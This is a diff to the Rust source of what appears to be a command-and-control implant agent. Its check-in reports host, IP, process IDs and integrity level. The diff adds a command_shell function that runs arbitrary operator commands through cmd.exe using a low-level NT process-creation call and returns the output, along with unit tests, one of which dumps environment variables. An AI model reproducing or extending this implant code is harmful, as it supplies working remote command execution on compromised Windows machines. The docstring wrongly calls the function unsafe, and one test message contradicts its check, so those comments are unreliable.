@@ -10,7 +10,7 @@ use mod_win32::{
         get_current_directory, get_image_path_name, get_os, get_os_version_info, get_process_name,
         get_user_domain, get_username,
     },
-    nt_ps_api::{get_pid_and_ppid, get_process_integrity},
+    nt_ps_api::{get_pid_and_ppid, get_process_integrity, nt_create_process_w_piped},
     nt_time::delay,
 };
 use rs2_communication_protocol::{
@@ -206,6 +206,50 @@ pub fn command_pwd() -> Result<String, AgentErrors> {
     Ok(current_dir)
 }
 
+/// Executes a command in a new process using `cmd.exe`.
+///
+/// This function spawns a new process using `nt_create_process_w_piped` and executes the
+/// specified command via `cmd.exe /c`. The output of the command is captured and returned
+/// as a `String`. If the output is empty, an error is returned.
+///
+/// # Parameters
+/// - `cmdline`: A string slice representing the command to be executed.
+///
+/// # Returns
+/// - `Result<String, AgentErrors>`: On success, returns the output of the command as a `String`.
+///   On failure, returns an `AgentErrors::CmdOutputIsEmpty` error if no output is captured.
+///
+/// # Errors
+/// - Returns `AgentErrors::CmdOutputIsEmpty` if the command returns an empty output.
+///
+/// # Safety
+/// - This function is marked `unsafe` because it interacts with the NT API through
+///   `nt_create_process_w_piped`, which involves low-level process creation.
+pub fn command_shell(cmdline: &str) -> Result<String, AgentErrors> {
+    let target_process = "C:\\Windows\\System32\\cmd.exe"; // Target path for cmd.exe
+    let cmd_prefix = "cmd.exe /c "; // Prefix to execute the command
+
+    // Use `nt_create_process_w_piped` to create a new process and execute the command.
+    // This returns a `Vec<u8>` containing the output.
+    let output = unsafe {
+        nt_create_process_w_piped(
+            &target_process,                               // Path to cmd.exe
+            format!("{}{}", cmd_prefix, cmdline).as_str(), // Full command to execute
+        )
+    };
+
+    // Check if the output is empty
+    if output.is_empty() {
+        return Err(AgentErrors::CmdOutputIsEmpty); // Return an error if no output is captured
+    }
+
+    // Convert the output (a byte vector) to a String, ensuring proper UTF-8 formatting
+    let output_str = String::from_utf8_lossy(&output);
+
+    // Return the output string (it's not a Cow<_, str>, it is converted to String here)
+    Ok(output_str.into_owned()) // `into_owned` converts the Cow to a full String
+}
+
 // #[cfg(feature = "std-runtime")]
 // Simulated task that takes 2 seconds to complete.
 pub fn task_type_a(metadata: Metadata) -> TaskOutput {
@@ -224,4 +268,107 @@ pub fn task_type_b(metadata: Metadata) -> TaskOutput {
     output.with_metadata(metadata);
     output.output = Some("Result from task type B".to_string());
     output
+}
+
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_checkin() {
+        // Test gathering system information and metadata for check-in
+        let result = command_checkin();
+
+        // Ensure the result is successful
+        assert!(
+            result.is_ok(),
+            "Failed to execute check-in command: {:?}",
+            result.err()
+        );
+
+        // Verify the JSON output contains expected fields
+        let json_output = result.unwrap();
+        assert!(json_output.contains("hostname"), "Missing 'hostname' field");
+        assert!(
+            json_output.contains("operative_system"),
+            "Missing 'operative_system' field"
+        );
+        assert!(json_output.contains("ip"), "Missing 'ip' field");
+        assert!(
+            json_output.contains("process_id"),
+            "Missing 'process_id' field"
+        );
+        assert!(
+            json_output.contains("parent_process_id"),
+            "Missing 'parent_process_id' field"
+        );
+        assert!(
+            json_output.contains("integrity_level"),
+            "Missing 'integrity_level' field"
+        );
+
+        // You can extend these checks with specific values or fields
+    }
+
+    #[test]
+    fn test_cd() {
+        // Test changing to a valid directory
+        let target_directory = "C:\\Windows\\System32\\drivers\\etc";
+        let result = command_cd(target_directory);
+        assert!(
+            result.is_ok(),
+            "Failed to change to directory: {}",
+            target_directory
+        );
+        let result_dir = result.unwrap();
+        assert!(
+            result_dir.ends_with("C:\\Windows\\System32\\drivers\\etc"),
+            "Expected directory: C:\\Windows\\System32\\drivers\\etc, but got: {}",
+            result_dir
+        );
+
+        // Test changing to the parent directory with "cd .."
+        let result = command_cd("..\\..");
+        assert!(result.is_ok(), "Failed to change to parent directory");
+        let result_dir = result.unwrap();
+        assert!(
+            result_dir.ends_with("C:\\Windows\\System32"),
+            "Expected directory: C:\\Windows, but got: {}",
+            result_dir
+        );
+    }
+
+    #[test]
+    fn test_pwd() {
+        let cwd = command_pwd();
+        assert!(
+            cwd.is_ok(),
+            "Expected cwd to be Ok, but got an error: {:?}",
+            cwd
+        );
+
+        // Optionally, you can unwrap after confirming it's Ok
+        let cwd_str = cwd.unwrap();
+        assert!(
+            !cwd_str.is_empty(),
+            "Expected a non-empty current directory"
+        );
+    }
+
+    #[test]
+    fn test_shell() {
+        // Test executing a simple command
+        let cmd = "set";
+        let result = command_shell(cmd);
+
+        // Ensure the result is successful
+        assert!(
+            result.is_ok(),
+            "Failed to execute command: {:?}",
+            result.err()
+        );
+
+        // Print the output for visibility
+        let output = result.unwrap();
+        libc_println!("Command Output: {}", output);
+    }
 }
